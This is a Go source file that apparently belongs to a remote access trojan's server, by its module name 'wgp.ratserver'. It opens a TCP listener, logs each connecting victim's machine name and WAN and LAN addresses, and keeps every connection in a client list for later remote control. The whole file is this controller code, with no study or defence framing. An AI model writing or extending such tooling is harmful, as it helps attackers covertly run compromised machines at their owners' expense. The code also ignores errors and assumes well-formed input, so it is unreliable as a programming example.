package server

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/desertbit/grumble"
	"wgp.ratserver/public"
)

func init() {
	startCommand := &grumble.Command{
		Name: "start",
		Help: "start server listening",
		Args: func(a *grumble.Args) {
			a.String("ip", "set listening ipaddress", grumble.Default("127.0.0.1"))
			a.Int("port", "set listening port", grumble.Default(7782))
		},
		Run: func(c *grumble.Context) error {
			ip := c.Args.String("ip")
			port := c.Args.Int("port")
			startListen(ip, port)
			return nil
		},
	}
	App.AddCommand(startCommand)
}

func startListen(ip string, port int) {
	server, err := net.Listen("tcp", ip+":"+strconv.Itoa(port))
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("[+] start listening ...")
	fmt.Printf("[+] listening -> %s:%d\n", ip, port)

	// 等待客户段连接的程序
	go func() {
		for {
			conn, err := server.Accept()
			if err != nil {
				fmt.Print("\n[x] error accetp :(")
			}
			prompt()
			buffer := make([]byte, 50)
			conn.Read(buffer)
			fmt.Println(buffer)
			fmt.Println("~" + strings.TrimSpace(string(buffer)) + "~")
			info := strings.Split(string(buffer), "|")
			clien := &public.Client{
				Conn:   conn,
				PcName: info[0],
				WlanIp: info[1],
				LanIp:  strings.TrimSpace(info[2]),
			}
			public.Clientlist = append(public.Clientlist, clien)
		}
	}()
}

func prompt() {
	for i := 0; i < 3; i++ {
		cmd := exec.Command("tput", "bel")
		cmd.Stdout = os.Stdout
		cmd.Stdin = os.Stdin
		cmd.Stderr = os.Stderr
		cmd.Run()
		time.Sleep(300 * time.Millisecond)
	}
}
